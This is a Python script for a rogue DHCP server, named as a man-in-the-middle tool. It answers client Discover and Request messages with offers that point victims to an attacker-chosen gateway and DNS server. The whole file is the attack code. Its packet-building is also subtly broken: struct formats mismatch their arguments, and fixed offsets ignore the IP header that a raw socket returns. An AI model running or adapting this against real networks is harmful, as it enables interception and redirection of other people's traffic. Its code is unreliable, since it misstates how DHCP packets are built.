import socket
import struct
import random
from socket import inet_ntoa, inet_aton

class DHCPMITMServer:
    DHCP_SERVER_PORT = 67
    DHCP_CLIENT_PORT = 68
    DHCP_MAGIC_COOKIE = b'\x63\x82\x53\x63'
    
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        self.sock.bind(('0.0.0.0', self.DHCP_SERVER_PORT))
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        self.leased_ips = {}
    
    def create_offer_packet(self, xid, chaddr, yiaddr):
        packet = b''
        packet += struct.pack('!4B I 2H 4s 4s 4s 4s 16s 64s 128s',
                              2, 1, 6, 0, xid, 0, 0,
                              0, 0, yiaddr, 0, 0,
                              chaddr, b'\x00'*64, b'\x00'*128)
        packet += self.DHCP_MAGIC_COOKIE
        packet += struct.pack('!BBB4s', 53, 1, 2, b'')  # DHCP Offer
        packet += struct.pack('!BBB4s', 1, 4, inet_aton('255.255.255.0'))  # Subnet Mask
        packet += struct.pack('!BBB4s', 3, 4, inet_aton('192.168.1.1'))  # Router (Gateway)
        packet += struct.pack('!BBB4s', 6, 4, inet_aton('192.168.1.2'))  # DNS Server
        packet += b'\xff'  # End option
        return packet
    
    def create_ack_packet(self, xid, chaddr, yiaddr):
        packet = b''
        packet += struct.pack('!4B I 2H 4s 4s 4s 4s 16s 64s 128s',
                              2, 1, 6, 0, xid, 0, 0,
                              0, 0, yiaddr, 0, 0,
                              chaddr, b'\x00'*64, b'\x00'*128)
        packet += self.DHCP_MAGIC_COOKIE
        packet += struct.pack('!BBB4s', 53, 1, 5, b'')  # DHCP ACK
        packet += struct.pack('!BBB4s', 1, 4, inet_aton('255.255.255.0'))  # Subnet Mask
        packet += struct.pack('!BBB4s', 3, 4, inet_aton('192.168.1.1'))  # Router (Gateway)
        packet += struct.pack('!BBB4s', 6, 4, inet_aton('192.168.1.2'))  # DNS Server
        packet += b'\xff'  # End option
        return packet
    
    def handle_dhcp(self, data):
        dhcp_header = struct.unpack('!4B I 2H 4s 4s 4s 4s 16s 64s 128s 4s', data[:240])
        xid, chaddr = dhcp_header[4], dhcp_header[11]
        message_type = data[240+4+2]  # DHCP Message Type option is the first option after cookie
        
        yiaddr = struct.pack('!I', random.randint(0xc0a80102, 0xc0a801fe))  # Random IP from 192.168.1.2-254
        self.leased_ips[chaddr] = yiaddr
        
        if message_type == 1:  # DHCP Discover
            offer_packet = self.create_offer_packet(xid, chaddr, yiaddr)
            self.sock.sendto(offer_packet, ('<broadcast>', self.DHCP_CLIENT_PORT))
            print(f"Sent DHCP Offer for {inet_ntoa(yiaddr)}")
        
        elif message_type == 3:  # DHCP Request
            ack_packet = self.create_ack_packet(xid, chaddr, yiaddr)
            self.sock.sendto(ack_packet, ('<broadcast>', self.DHCP_CLIENT_PORT))
            print(f"Sent DHCP ACK for {inet_ntoa(yiaddr)}")
    
    def run(self):
        print("DHCP MITM Server is running...")
        while True:
            data, _ = self.sock.recvfrom(1024)
            self.handle_dhcp(data)

if __name__ == "__main__":
    server = DHCPMITMServer()
    server.run()
